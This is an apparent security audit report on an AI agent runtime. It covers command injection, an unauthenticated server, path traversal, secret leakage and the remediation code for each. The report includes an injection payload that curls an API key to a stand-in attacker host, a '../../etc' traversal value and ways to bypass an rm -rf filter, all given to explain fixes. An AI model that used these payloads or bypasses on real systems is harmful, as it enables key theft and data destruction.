# Security Audit Report — Friday Runtime v0.2

**Date:** 2026-02-14
**Scope:** `packages/runtime/src/`, `packages/cli/src/`, `packages/runtime/providers/`
**Focus:** API key protection, agent hijacking prevention, container security

---

## Critical Findings

### 1. Command Injection via `exec()` in OAuth Flow

**File:** `packages/runtime/src/oauth/McpOAuthManager.js:419-435`
**Risk:** CRITICAL — Remote Code Execution

The `openBrowser()` function passes a URL into `exec()` via string interpolation:

```javascript
cmd = `open "${url}"`;  // URL interpolated into shell command
exec(cmd, ...);
```

If an OAuth provider returns a crafted redirect URL containing shell metacharacters (e.g. `"; curl attacker.com/steal?key=$ANTHROPIC_API_KEY"`), it breaks out of the quotes and executes arbitrary commands — **including exfiltrating every API key in the environment**.

**Action:**
```javascript
// Replace exec() with execFile() — no shell interpretation
import { execFile } from 'child_process';
if (platform === 'darwin') execFile('open', [url]);
else if (platform === 'win32') execFile('cmd', ['/c', 'start', '', url]);
else execFile('xdg-open', [url]);
```

---

### 2. No Authentication on HTTP/WebSocket Server

**File:** `packages/runtime/server.js`, `packages/cli/src/commands/serve.js`
**Risk:** CRITICAL — Full Agent Hijack

The server has `Access-Control-Allow-Origin: *` and zero authentication. Anyone who can reach the port can:
- Send queries as the user
- Read all session history
- List and trigger agents
- Execute tools (file writes, terminal commands) using the agent's permissions

In a container with port forwarding, this means **anyone on the network owns the agent**.

**Action:**
- Add bearer token authentication (token generated at startup, printed to stdout)
- Restrict CORS to explicit origins or remove wildcard
- Add rate limiting on the HTTP server
- Add `--bind` flag to restrict to localhost by default

```javascript
// Generate auth token at startup
const AUTH_TOKEN = crypto.randomBytes(32).toString('hex');
console.log(`Auth token: ${AUTH_TOKEN}`);

// Middleware
function authenticate(req, res) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (token !== AUTH_TOKEN) {
    sendJson(res, 401, { error: 'Unauthorized' });
    return false;
  }
  return true;
}
```

---

### 3. Path Traversal — userId/agentId Not Validated

**Files:**
- `packages/runtime/src/scheduled-agents/ScheduledAgentStore.js:74-75`
- `packages/runtime/src/agents/AgentManager.js:50-51`

**Risk:** HIGH — File Read/Write Outside Intended Directory

User IDs and agent IDs are concatenated directly into file paths:

```javascript
getUserDir(userId) {
  return path.join(this.dataDir, userId);  // userId = "../../etc" → escapes
}
```

An attacker with API access (see #2) can read/overwrite arbitrary JSON files on the system.

**Action:**
```javascript
function sanitizeId(id) {
  if (!id || typeof id !== 'string') throw new Error('Invalid ID');
  // Strip path separators and traversal
  const clean = id.replace(/[^a-zA-Z0-9._-]/g, '');
  if (clean !== id || clean.includes('..')) throw new Error('Invalid ID format');
  return clean;
}

// Apply in getUserDir, getSessionDir, etc.
getUserDir(userId) {
  return path.join(this.dataDir, sanitizeId(userId));
}
```

---

### 4. Unrestricted Environment Variable Access in Templates

**File:** `packages/runtime/src/config.js:43-50`
**Risk:** HIGH — API Key Exfiltration via Config

The `applyTemplate()` function resolves `${VAR}` against the full `process.env`:

```javascript
return process.env[key] || '';  // ANY env var accessible
```

If a user-provided MCP server config (via `~/.friday/user-mcp-servers.json`) contains `${ANTHROPIC_API_KEY}` in its args, the key gets injected into the command line — visible in `ps aux` to any user on the system.

**Action:**
```javascript
const ALLOWED_TEMPLATE_VARS = new Set([
  'HOME', 'WORKSPACE', 'FRIDAY_CONFIG_DIR', 'FRIDAY_WORKSPACE',
  'USER', 'TMPDIR',
]);

function applyTemplate(value, context) {
  if (typeof value === 'string') {
    return value.replace(/\$\{([^}]+)\}/g, (_, key) => {
      if (Object.prototype.hasOwnProperty.call(context, key)) return context[key];
      if (ALLOWED_TEMPLATE_VARS.has(key)) return process.env[key] || '';
      return '';  // Block access to API keys and secrets
    });
  }
  // ...
}
```

Apply the same restriction in `PluginManager._resolveTemplate()`.

---

### 5. API Keys Stored in Plaintext Without File Permissions

**Files:**
- `packages/cli/src/commands/setup.js:38-50` — writes `~/.friday/.env`
- `packages/runtime/src/mcp/McpCredentials.js:120,128` — writes credentials JSON
- `packages/runtime/src/plugins/PluginManager.js:91` — writes `plugins.json` with creds

**Risk:** MEDIUM — Key Theft by Local Users

All credential files are written with default permissions (`0o644` = world-readable). Any user on a shared system can read every API key.

**Action:**
```javascript
// For ALL files containing secrets:
fs.writeFileSync(path, content, { mode: 0o600 }); // owner read/write only

// For directories containing secrets:
fs.mkdirSync(dir, { recursive: true, mode: 0o700 }); // owner only
```

Files to fix:
- `~/.friday/.env`
- `~/.friday/config.json`
- `~/.friday/plugins.json`
- `~/.friday/credentials.json`
- `~/.friday/provider-preferences.json`
- `~/.friday/permissions.json`

---

### 6. Full Environment Passed to Child Processes

**File:** `packages/cli/src/commands/chat.js:181,187-190`
**Risk:** MEDIUM — Key Exposure in Process Table

```javascript
const env = { ...process.env, FRIDAY_WORKSPACE: workspacePath };
const backend = spawn('node', [serverScript], { env, ... });
```

The entire environment (every API key, every secret) is passed to the child process. If the child crashes, core dumps may contain keys. On Linux, `/proc/<pid>/environ` exposes all env vars to same-user processes.

**Action:**
```javascript
// Only pass what's needed
const PASSTHROUGH_VARS = [
  'PATH', 'HOME', 'USER', 'TMPDIR', 'NODE_ENV',
  'ANTHROPIC_API_KEY',
  'OPENAI_API_KEY', 'GOOGLE_API_KEY', 'ELEVENLABS_API_KEY',
  'FRIDAY_CONFIG_DIR', 'FRIDAY_WORKSPACE',
];

const env = { FRIDAY_WORKSPACE: workspacePath };
for (const key of PASSTHROUGH_VARS) {
  if (process.env[key]) env[key] = process.env[key];
}
```

---

### 7. No Request Body Size Limit on HTTP Server

**File:** `packages/runtime/server.js:12-25`, `packages/cli/src/commands/serve.js`
**Risk:** MEDIUM — Denial of Service

```javascript
req.on('data', chunk => body += chunk);  // No size limit
```

An attacker can send a multi-GB POST body to exhaust server memory.

**Action:**
```javascript
const MAX_BODY_SIZE = 1_048_576; // 1 MB
let body = '';
req.on('data', chunk => {
  body += chunk;
  if (body.length > MAX_BODY_SIZE) {
    req.destroy();
    sendJson(res, 413, { error: 'Payload too large' });
  }
});
```

---

### 8. Dangerous Command Filter Bypass

**File:** `packages/runtime/src/runtime/AgentRuntime.js:39-84`
**Risk:** MEDIUM — Agent Executes Blocked Commands

The dangerous command filter uses simple regex patterns that can be bypassed:
- `rm -rf /` blocked, but `rm -r -f /` or `rm --recursive --force /` may not be
- Encoded/obfuscated commands not caught
- Commands piped through `bash -c` or `sh -c` not inspected

**Action:**
- Parse the command with a proper shell lexer before matching
- Block `bash -c`, `sh -c`, `eval` patterns that wrap other commands
- Add `env` command to blocked list (prevents `env -i bash` escapes)

---

### 9. OAuth Callback — No Host Header Validation

**File:** `packages/runtime/src/oauth/McpOAuthManager.js:200-244`
**Risk:** LOW — OAuth Token Interception

The OAuth callback server doesn't validate the Host header. Combined with DNS rebinding, an attacker could redirect the callback through their server and steal the OAuth token.

**Action:**
```javascript
const host = req.headers.host;
if (host !== `${CALLBACK_HOST}:${CALLBACK_PORT}`) {
  res.writeHead(400);
  res.end('Invalid host');
  return;
}
```

---

## Container-Specific Risks

### Docker / Remote Deployment

| Risk | Impact | Mitigation |
|------|--------|------------|
| Port exposed without auth | Full agent hijack | Auth token (see #2) |
| API keys in env vars visible via `docker inspect` | Key theft | Use Docker secrets or mounted files |
| Container escape via agent tool use | Host compromise | Run as non-root, use `--security-opt=no-new-privileges` |
| Log files contain sensitive data | Key exposure | Redact API keys from all log output |
| Core dumps contain env vars | Key theft | Disable core dumps: `--ulimit core=0` |

**Recommended docker-compose hardening:**
```yaml
services:
  friday:
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
    ulimits:
      core: 0
    user: "1000:1000"  # non-root
```

---

## Action Plan — Priority Order

### P0 — Must Fix Before Any Remote Deployment

| # | Issue | File(s) | Effort |
|---|-------|---------|--------|
| 2 | Add auth to HTTP/WS server | `server.js`, `serve.js` | 2-3 hours |
| 1 | Replace `exec()` with `execFile()` | `McpOAuthManager.js` | 30 min |
| 5 | Set `mode: 0o600` on all credential files | setup.js, McpCredentials.js, PluginManager.js, PermissionManager.js, ProviderRegistry.js | 1 hour |

### P1 — Fix Before Public npm Publish

| # | Issue | File(s) | Effort |
|---|-------|---------|--------|
| 3 | Validate userId/agentId (sanitize path components) | ScheduledAgentStore.js, AgentManager.js | 1 hour |
| 4 | Whitelist template variables | config.js, PluginManager.js | 1 hour |
| 6 | Restrict env passthrough to child processes | chat.js | 30 min |
| 7 | Add request body size limit | server.js, serve.js | 30 min |

### P2 — Fix Before Production Use

| # | Issue | File(s) | Effort |
|---|-------|---------|--------|
| 8 | Harden dangerous command filter | AgentRuntime.js | 2-3 hours |
| 9 | Validate OAuth callback Host header | McpOAuthManager.js | 30 min |
| — | Add API key redaction to all log output | Runtime-wide | 2 hours |
| — | Docker hardening (non-root, read-only, no core dumps) | Dockerfile, docker-compose.yml | 1 hour |

---

## Verification Checklist

After fixes are applied, verify:

- [ ] `curl http://localhost:8787/sessions` returns 401 without auth token
- [ ] `curl -H "Authorization: Bearer <token>" http://localhost:8787/sessions` returns 200
- [ ] `ls -la ~/.friday/` shows `0600` permissions on all JSON files
- [ ] `ps aux | grep friday` does not show any API keys in command args
- [ ] Template `${ANTHROPIC_API_KEY}` in user-mcp-servers.json resolves to empty string
- [ ] userId `../../etc` returns validation error, not file contents
- [ ] OAuth browser open uses `execFile`, not `exec`
- [ ] Docker container runs as non-root user
- [ ] `docker inspect <container>` doesn't show API keys (use secrets/mounted files)
